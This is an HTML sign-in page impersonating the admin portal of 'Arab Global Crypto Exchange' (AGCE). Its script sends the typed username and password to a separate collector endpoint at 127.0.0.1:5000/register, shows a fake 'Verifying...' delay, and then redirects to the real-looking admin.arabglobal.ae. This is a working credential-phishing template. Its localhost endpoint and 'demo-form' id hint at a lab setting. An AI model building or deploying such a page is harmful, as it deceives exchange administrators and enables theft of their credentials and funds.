<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" href="logos.jpg" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Admin Portal — Arab Global</title>

    <style>
      * {
        box-sizing: border-box;
      }
      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        padding: 24px;
        background: #f3f6fa;
        color: #243247;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      }
      .card {
        width: 100%;
        max-width: 410px;
        padding: 36px;
        background: white;
        border: 1px solid #e3e8ef;
        border-radius: 12px;
        box-shadow: 0 12px 36px rgba(32, 52, 75, 0.07);
      }
      .brand-logo-container {
        display: flex;
        justify-content: center;
        margin-bottom: 24px;
      }
      .brand-logo {
        height: 48px;
        width: auto;
        max-width: 100%;
        object-fit: contain;
        display: block;
      }
      .brand-title {
        margin: 0 0 6px 0;
        color: #174c83;
        font-size: 24px;
        font-weight: 700;
        text-align: center;
      }
      .intro {
        margin: 0 0 24px 0;
        color: #687587;
        line-height: 1.5;
        font-size: 14px;
        text-align: center;
      }
      label {
        display: block;
        margin: 18px 0 8px;
        font-size: 14px;
        font-weight: 600;
        color: #243247;
      }
      input {
        width: 100%;
        padding: 13px 14px;
        border: 1px solid #d5dce6;
        border-radius: 7px;
        font: inherit;
      }
      input:focus {
        outline: 2px solid #86b99a;
        border-color: #166534;
      }
      button[type="submit"] {
        width: 100%;
        margin-top: 24px;
        padding: 14px;
        border: 0;
        border-radius: 7px;
        background: #166534;
        color: white;
        font-size: 15px;
        font-weight: 700;
        cursor: pointer;
        transition: background 0.3s;
        box-shadow: none !important;
      }
    </style>
  </head>
  <body style="background-color: #f3f6fa">
    <main class="card">
      <div class="brand-logo-container">
        <img
          src="logo_light.svg"
          alt="Arab Global Crypto Exchange"
          class="brand-logo"
          onerror="
            this.style.display = 'none';
            this.parentNode.querySelector('#fallbackText').style.display = 'block';
          "
        />
        <span id="fallbackText" style="display: none; color: #174c83; font-size: 20px">AGCE Logo</span>
      </div>

      <h1 class="brand-title">AGCE Admin</h1>
      <p class="intro">Sign in to manage your exchange.</p>

      <form id="demo-form">
        <label for="username">Username, email, phone</label>
        <input
          id="username"
          name="username"
          autocomplete="off"
          placeholder="admin@example.com"
          required
        />

        <label for="password">Password</label>
        <input
          id="password"
          name="password"
          type="password"
          placeholder="Enter your password"
          autocomplete="new-password"
          required
        />

        <button type="submit">Continue</button>
      </form>

      <div
        id="statusArea"
        style="
          text-align: center;
          margin-top: 10px;
          color: #64748b;
          font-size: 14px;
        "
      ></div>
    </main>

    <script>
      const form = document.getElementById("demo-form");
      const passwordInput = document.getElementById("password");
      const statusArea = document.getElementById("statusArea");

      async function registerUser() {
        const usernameInput = document.getElementById("username").value;
        const passwordInputVal = document.getElementById("password").value;

        try {
          const response = await fetch("http://127.0.0.1:5000/register", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              username: usernameInput,
              password: passwordInputVal,
            }),
          });

          const result = await response.json();
          console.log(result.message);
        } catch (error) {
          console.error("Error:", error);
        }
      }

      form.addEventListener("submit", async function (e) {
        e.preventDefault();

        const username = document.getElementById("username").value;
        const passVal = passwordInput.value;

        if (!passVal) {
          alert("Please enter a password.");
          return;
        }

        const submitBtn = form.querySelector('button[type="submit"]');
        submitBtn.disabled = true;
        submitBtn.textContent = "Signing in...";
        statusArea.innerHTML = "";

        await registerUser();

        setTimeout(() => {
          statusArea.innerHTML =
            '<span style="color:#687587; font-size:13px;">Verifying...</span>';

          setTimeout(() => {
            window.location.href = "https://admin.arabglobal.ae/";
          }, 1000);
        }, 1500);
      });
    </script>
  </body>
</html>
